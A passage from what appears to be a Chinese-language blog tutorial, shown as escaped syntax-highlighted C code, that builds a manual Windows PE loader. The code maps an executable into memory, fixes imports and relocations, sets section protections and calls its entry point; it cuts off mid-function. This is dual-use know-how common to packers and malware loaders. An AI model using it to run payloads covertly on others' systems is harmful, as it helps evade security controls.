&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">DWORD&lt;/span> &lt;span class="n">size&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">p_reloc&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">SizeOfBlock&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">IMAGE_BASE_RELOCATION&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">/&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// the first relocation element in the block, right after the header (using pointer arithmetic again)
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">WORD&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">fixups&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">WORD&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">p_reloc&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="n">size&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="o">++&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// type is the first 4 bits of the relocation word
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">type&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">fixups&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">&amp;gt;&amp;gt;&lt;/span> &lt;span class="mi">12&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// offset is the last 12 bits
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">offset&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">fixups&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">&amp;amp;&lt;/span> &lt;span class="mh">0x0fff&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// this is the address we are going to change
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">DWORD&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">change_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">DWORD&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">p_image_base&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">p_reloc&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">VirtualAddress&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">offset&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// there is only one type used that needs to make a change
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">switch&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">type&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="nl">IMAGE_REL_BASED_HIGHLOW&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="o">*&lt;/span>&lt;span class="n">change_addr&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="n">delta_VA_reloc&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">default&lt;/span>&lt;span class="o">:&lt;/span>
&lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// switch to the next relocation block, based on the size
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">p_reloc&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">IMAGE_BASE_RELOCATION&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(((&lt;/span>&lt;span class="n">DWORD&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">p_reloc&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">p_reloc&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">SizeOfBlock&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="0x05-完整-loader-程序">0x05 完整 Loader 程序&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;Windows.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;winnt.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nf">load_PE&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">PE_data&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="kt">void&lt;/span> &lt;span class="nf">fix_iat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">IMAGE_NT_HEADERS&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="kt">void&lt;/span> &lt;span class="nf">fix_base_reloc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">p_image_base&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">IMAGE_NT_HEADERS&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">p_NT_headers&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">argc&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="k">const&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">argv&lt;/span>&lt;span class="p">[])&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">argc&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;missing path argument&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="n">FILE&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">exe_file&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">fopen&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">argv&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="s">&amp;#34;rb&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="n">exe_file&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;error opening file&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// Get file size : put pointer at the end
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">fseek&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">exe_file&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0L&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">SEEK_END&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// and read its position
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="kt">long&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">file_size&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">ftell&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">exe_file&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// put the pointer back at the beginning
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">fseek&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">exe_file&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0L&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">SEEK_SET&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// allocate memory and read the whole file
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">exe_file_data&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">malloc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">file_size&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// read whole file
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">size_t&lt;/span> &lt;span class="n">n_read&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">fread&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">exe_file_data&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">file_size&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">exe_file&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">n_read&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="n">file_size&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;reading error (%d)&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">n_read&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// load the PE in memory
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;[+] Loading PE file&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">entry&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">load_PE&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">exe_file_data&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">entry&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// call its entrypoint
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="n">entry&lt;/span>&lt;span class="p">)();&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nf">load_PE&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">PE_data&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">IMAGE_DOS_HEADER&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">p_DOS_header&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">IMAGE_DOS_HEADER&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">PE_data&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">IMAGE_NT_HEADERS&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">p_NT_headers&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">IMAGE_NT_HEADERS&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">PE_data&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">p_DOS_header&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">e_lfanew&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// extract information from PE header
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">DWORD&lt;/span> &lt;span class="n">size_of_image&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">p_NT_headers&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">OptionalHeader&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">SizeOfImage&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">DWORD&lt;/span> &lt;span class="n">entry_point_RVA&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">p_NT_headers&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">OptionalHeader&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">AddressOfEntryPoint&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">DWORD&lt;/span> &lt;span class="n">size_of_headers&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">p_NT_headers&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">OptionalHeader&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">SizeOfHeaders&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// allocate memory
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">p_image_base&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">VirtualAlloc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">NULL&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">size_of_image&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">MEM_RESERVE&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">MEM_COMMIT&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">PAGE_READWRITE&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">p_image_base&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// copy PE headers in memory
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">memcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">p_image_base&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">PE_data&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">size_of_headers&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// Section headers starts right after the IMAGE_NT_HEADERS struct, so we do some pointer arithmetic-fu here.
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">IMAGE_SECTION_HEADER&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">sections&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">IMAGE_SECTION_HEADER&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">p_NT_headers&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="n">p_NT_headers&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">FileHeader&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">NumberOfSections&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// calculate the VA we need to copy the content, from the RVA
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// section[i].VirtualAddress is a RVA, mind it
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">dest&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">p_image_base&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">sections&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">VirtualAddress&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// check if there is Raw data to copy
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">sections&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">SizeOfRawData&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// We copy SizeOfRaw data bytes, from the offset PointerToRawData in the file
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">memcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">dest&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">PE_data&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">sections&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">PointerToRawData&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">sections&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">SizeOfRawData&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">memset&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">dest&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">sections&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">Misc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">VirtualSize&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="n">fix_iat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">p_image_base&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">p_NT_headers&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">fix_base_reloc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">p_image_base&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">p_NT_headers&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// Set permission for the PE header to read only
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">DWORD&lt;/span> &lt;span class="n">oldProtect&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">VirtualProtect&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">p_image_base&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">p_NT_headers&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">OptionalHeader&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">SizeOfHeaders&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">PAGE_READONLY&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">oldProtect&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="n">p_NT_headers&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">FileHeader&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">NumberOfSections&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="o">++&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">dest&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">p_image_base&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">sections&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">VirtualAddress&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">DWORD&lt;/span> &lt;span class="n">s_perm&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">sections&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">Characteristics&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">DWORD&lt;/span> &lt;span class="n">v_perm&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// flags are not the same between virtal protect and the section header
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">s_perm&lt;/span> &lt;span class="o">&amp;amp;&lt;/span> &lt;span class="n">IMAGE_SCN_MEM_EXECUTE&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">v_perm&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">s_perm&lt;/span> &lt;span class="o">&amp;amp;&lt;/span> &lt;span class="n">IMAGE_SCN_MEM_WRITE&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="nl">PAGE_EXECUTE_READWRITE&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="n">PAGE_EXECUTE_READ&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">v_perm&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">s_perm&lt;/span> &lt;span class="o">&amp;amp;&lt;/span> &lt;span class="n">IMAGE_SCN_MEM_WRITE&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="nl">PAGE_READWRITE&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="n">PAGE_READONLY&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="n">VirtualProtect&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">dest&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">sections&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">Misc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">VirtualSize&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">v_perm&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">oldProtect&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">p_image_base&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">entry_point_RVA&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kt">void&lt;/span> &lt;span class="nf">fix_iat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">p_image_base&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">IMAGE_NT_HEADERS&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">p_NT_headers&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">IMAGE_DATA_DIRECTORY&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">data_directory&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">p_NT_headers&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">OptionalHeader&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">DataDirectory&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// load the address of the import descriptors array
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">IMAGE_IMPORT_DESCRIPTOR&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">import_descriptors&lt;/span> &lt;span class="o">=&lt;/span>
&lt;span class="p">(&lt;/span>&lt;span class="n">IMAGE_IMPORT_DESCRIPTOR&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">p_image_base&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">data_directory&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">IMAGE_DIRECTORY_ENTRY_IMPORT&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">VirtualAddress&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// this array is null terminated
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">import_descriptors&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">OriginalFirstThunk&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="o">++&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Get the name of the dll, and import it
